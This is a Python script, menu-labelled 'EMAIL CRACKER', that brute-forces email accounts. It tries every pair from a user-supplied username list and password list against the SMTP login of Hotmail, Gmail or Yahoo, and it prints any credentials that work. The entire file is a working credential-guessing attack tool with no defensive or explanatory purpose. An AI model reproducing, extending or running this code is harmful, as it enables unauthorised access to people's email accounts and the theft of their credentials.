#-*-coding: utf-8-*-
from socket import *
import threading
from smtplib import SMTP
import os
from getpass import getpass

def getdfile(name):
	dic = ""
	while True:
		os.system("cls")
		dicp = input("Please write the path of the {} dictionary file: ".format(name))
		try:
			dfile = open(dicp, "r")
		except:
			continue
		else:
			dfile.close()
			return dicp

def bforce(smtpserver, udic, pdic):
	os.system("cls")
	print("Starting brute force attack...")
	server = SMTP(smtpserver)
	server.starttls()
	ufile = open(udic, "r")
	pfile = open(pdic, "r")
	ulist = ufile.readlines()
	plist = pfile.readlines()
	for user in ulist:
		for passw in plist:
			try:
				print("[?]trying: {}/{}".format(user.strip("\n"), passw.strip("\n")))
				server.login(user.strip("\n"), passw.strip("\n"))
			except:
				print("[-]Wrong user or password.")
			else:
				print("User: {}\nPassword: {}".format(user, passw))
				getpass("Press enter to continue...")
				server.close()
				ufile.close()
				pfile.close()
				return 0
	getpass("Press enter to continue.")
	server.close()
	ufile.close()
	pfile.close()

if __name__ == '__main__':
	pdic = getdfile("passwords")
	udic = getdfile("users")
	do = str("")
	while do != "e":
		os.system("cls")
		do = input('''

		    E M A I L   C R A C K E R
		    _________________________
	            C R A C K
	            _________________________                     
                     
                             [H]otmail           
		             [G]mail             
		             [Y]ahoo
		    __________________________
		   
		    C H A N G E  D I C
		    __________________________
		             
		             [U]ser dic
		             [P]assword dic
		    __________________________
		             
		             [E]xit
		    __________________________


		        	>>>>>  ''')
		do = do.lower()

		if do == "h":
			bforce('smtp.live.com:587', udic, pdic)
		elif do == "g":
			bforce('smtp.gmail.com:587', udic, pdic)
		elif do == "y":
			bforce('smtp.mail.yahoo.com:25', udic, pdic)
		elif do == "u":
			udic = getdfile("users")
		elif do == "p":
			pdic = getdfile("passwords")